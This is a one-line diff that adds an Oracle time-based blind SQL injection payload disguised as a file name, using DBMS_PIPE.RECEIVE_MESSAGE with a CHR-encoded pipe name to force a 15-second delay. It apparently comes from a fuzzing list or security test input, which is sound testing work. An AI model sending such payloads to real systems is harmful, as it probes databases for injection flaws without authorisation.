@@ -1,0 +1,1 @@
+file.txt'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
